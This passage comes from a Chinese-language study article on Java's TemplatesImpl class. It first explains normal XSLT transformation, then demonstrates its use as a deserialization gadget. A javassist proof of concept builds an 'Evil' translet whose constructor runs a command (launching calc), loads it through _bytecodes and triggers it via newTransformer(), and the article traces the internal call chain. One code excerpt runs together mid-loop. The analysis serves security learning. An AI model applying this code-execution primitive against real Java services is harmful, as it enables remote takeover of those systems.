            return newTransformer().getOutputProperties();
        }
        catch (TransformerConfigurationException e) {
            return null;
        }
    }
####  4.5、方法说明：
修饰 | 方法  
---|---  
private void | defineTransletClasses()：定义Translet类和辅助类。  
java.util.Properties |
getOutputProperties()：实现了JAXP的Templates.getOutputProperties()。  
DOM | getStylesheetDOM()：返回样式表DOM的线程本地副本。  
byte[][] | getTransletBytecodes()： 返回Translet字节码  
java.lang.Class[] | getTransletClasses()：返回Translet字节码  
int | getTransletIndex()： 返回主类在字节码数组中的索引  
private Translet | getTransletInstance()：生成Translet类的实例。  
protected java.lang.String | getTransletName()：返回Translet主类的名称  
javax.xml.transform.Transformer |
newTransformer()：实现了JAXP的Templates.newTransformer ()  
private void | readObject(java.io.ObjectInputStream is)：重写readObject  
void | setStylesheetDOM(DOM sdom)：设置样式表DOM的线程本地副本  
protected void | setTransletBytecodes(byte[][]
bytecodes)：获取TransformerFactory设置的Translet字节码并创建Translet实例。  
protected void | setTransletName(java.lang.String
name)：TransformerFactory调用此方法来设置Translet名称  
void | setURIResolver(javax.xml.transform.URIResolver
resolver)：设置Transformer所需的URIResolver。  
private void | writeObject(java.io.ObjectOutputStream
os)：实现了URIResolver和Serializable的类将被序列化  
###  5、XML-XSLT-HTML在Java中的转换实例
接下来我们看一个XML-XSLT-HTML的常规转换例子，通过这个例子我们可以知道转换在Java中实现的步骤。
    import javax.xml.transform.*;
    import java.io.FileNotFoundException;
    import java.io.FileOutputStream;
    public class TestTmp {
        public static void main(String[] args) throws TransformerException, FileNotFoundException {
            new TestTmp().testTransform();
        }
        public void testTransform() throws TransformerException, FileNotFoundException {
            /*---- 1、使用TransformFactory的newInstance方法创建一个新的实例。-------------------*/
            // TransformFactory的缺省实现 是com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl类
            TransformerFactory oFactory = TransformerFactory.newInstance();
            /*---- 2、使用TransformFactory的newTemplates方法创建一个Templates界面的实现对象。-------------------*/
            //Templates的缺省实现 是org.apache.xalan.templates.StylesheetRoot
            Templates oTemplates = oFactory.newTemplates(
                    //使用一个StreamSource对象来读取一个xsl文档
                    new javax.xml.transform.stream.StreamSource("cdcatalog.xsl")
            );
            /*---- 3、使用Templates的newTransformer方法创建一个新的Transformer。 -------------------*/
            //Transformer的缺省实现 是com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
            Transformer transformer = oTemplates.newTransformer();
            /*---- 4、使用Transformer进行转换。  -------------------*/
            transformer.transform(
                    //创建一个StreamSource对象来读取atom.xml
                    new javax.xml.transform.stream.StreamSource("cdcatalog.xml"),
                    //使用out作为输出writer创建一个StreamResult输出转换结果。
                    new javax.xml.transform.stream.StreamResult(new FileOutputStream("E:\\1.html")));
        }
    }
执行上面代码最终会在文件夹下生成一个1.html文件，1.html跟上述第一部分的示例转换结果一致。  
通过上面代码，我们可以总结出一个XML-XSLT-HTML的转换在Java中一般有以下4个步骤：
  1. 创建一个TransformFactory对象；
  2. 调用TransformFactory.newTemplates通过XSL样式表创建一个Templates对象；
  3. 调用Templates.newTransformer创建一个Transformer对象；
  4. 最后通过Transformer.transform将源-XML文档转换为目标-HTML文档。
其中需要注意的是以上接口的 **缺省实现** 都是Xalan提供的com.sun.org.apache.xalan库内对应的实现类来创建对象。
TransformFactory.newTemplates通过XSL样式表创建一个Templates对象，其实现主要由三个部分：
  1. 如果_useClasspath属性为true，则尝试从CLASSPATH加载文件，并使用XSL样式表文件加载后的Class创建模板对象：调用new TemplatesImpl(new Class[]{clazz}, transletName, null, _indentNumber, this)；
  2. 如果_autoTranslet为true，将尝试在不编译样式表的情况下从translet类加载字节码来创建对象；
  3. 以上两种条件不满足，直接创建并初始化样式表编译器来编译样式表，生成字节码，通过字节码创建模板对象。
## 二、TemplatesImpl被反序列化漏洞利用的特性
清楚了TemplatesImpl的方法和使用方式，接下来这部分我们探索下它跟反序列化漏洞的关系。
###  1、JDK7u21的TemplatesImpl利用测试
我们将[JDK7u21分析poc](https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/#TemplatesImpl)的`return
templates;`改为`templates.newTransformer()`进行测试。
    public void testTemplate() throws Exception {
        // 1、通过javassist创建一个Evil类的字节码，设置它的构造方法内部调用exec方法
        ClassPool pool = ClassPool.getDefault();//ClassPool对象是一个表示class文件的CtClass对象的容器
        CtClass cc = pool.makeClass("Evil");//创建Evil类
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//设置Evil类的父类为AbstractTranslet
        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);//创建无参构造函数
        cons.setBody("{ Runtime.getRuntime().exec(\"calc\"); }");//设置无参构造函数体
        cc.addConstructor(cons);
        byte[] byteCode = cc.toBytecode();//toBytecode得到Evil类的字节码
        byte[][] targetByteCode = new byte[][]{byteCode};
        // 2、创建一个TemplatesImpl对象，设置属性_bytecodes值为Evil类的字节码
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCode);//设置_bytecodes是属性
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_name", "xx");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        // 3、调用newTransformer()
        templates.newTransformer();
    }
    //通过反射为obj的属性赋值
    private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
调用上述testTemplate方法，最终会弹出计算器：
为什么能够执行`Runtime.getRuntime().exec(\"calc\")`，关键点在于第3步`templates.newTransformer();`，接下来重点分析下。
### 2、`newTransformer()`分析：
####  2.1、newTransformer
根据4.4我们知道newTransformer()会调用TransformerImpl构造函数创建实例：`new
TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber,
_tfactory)`，getTransletInstance()会返回Translet类的实例；
####  2.2、getTransletInstance
getTransletInstance在一开始时对_name和_class实现进行了判断，当_name不为null而_class是null就会调用defineTransletClasses来获取Translet的Class对象，接着会调用newInstance实例化Translet。
    //如果_name属性为null返回Translet是null
    if (_name == null) return null;
    // 如果_class属性是null调用defineTransletClasses
    if (_class == null) defineTransletClasses();
    // 当属性_class被赋值，即要转换的样式表class文件translet类存在，通过translet类来实例化
    AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
    translet.postInitialization();
    translet.setTemplates(this);
    translet.setOverrideDefaultParser(_overrideDefaultParser);
    translet.setAllowedProtocols(_accessExternalStylesheet);
    if (_auxClasses != null) {
        // translet需要保留对所有辅助类的引用，以防止GC收集它们
        translet.setAuxiliaryClasses(_auxClasses);
    }
    return translet;
####  2.3、defineTransletClasses：
defineTransletClasses用来定义translet类和辅助类，会创建一个内部类TransletClassLoader的对象，通过该对象调用defineClass，根据之前4.1的分析我们知道defineClass会调用Java虚拟机的native方法生成一个Translet类的Class对象。所以到这里我们最终能够获取到Evil字节码生成的Class对象，再经过2.2`AbstractTranslet
translet = (AbstractTranslet)
_class[_transletIndex].newInstance()`对Evil类进行实例化，最终能够执行命令弹出计算器。以下是defineTransletClasses的关键代码摘取：
    // 字节码未定义抛出异常
    if (_bytecodes == null) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }
    //创建一个内部类TransletClassLoader的对象
    TransletClassLoader loader = (TransletClassLoader)
        // 注意_tfactory.getExternalExtensionsMap()调用TransformerFactoryImpl的getExternalExtensionsMap，因此_tfactory我们要注意赋值，并且是TransformerFactoryImpl的实例
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());}});
    // 循环定义所有类，包括translet主类和它的内部类
    _class = new Class[classCount];
    for (int i = 0; i getTransletInstance()->defineTransletClasses()
    getOutputProperties()->newTransformer()->getTransletInstance()->defineTransletClasses()
## 三、总结与思考
通过本次学习我们了解了`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`本身是用来进行xsl转换的，主要通过XSLTC接收xsl文档生成的Translets类的字节码来创建
XSLTC
模板对象。那么由于需要处理字节码，其在内部定义了类加载器并重载了defineClass，defineClass能够返回字节码的Class对象方便后续的实例化，而这也是我们能够利用它执行恶意代码的关键。
通过构造恶意类的字节码并使用defineClass返回其Class对象，实例化后即可执行我们想要的结果。继续思考，我们可以想到Java是否还存在类似的类（内部定义了类加载器并重载了defineClass）能被我们利用，这里不展开了可自行探索。
## 参考链接：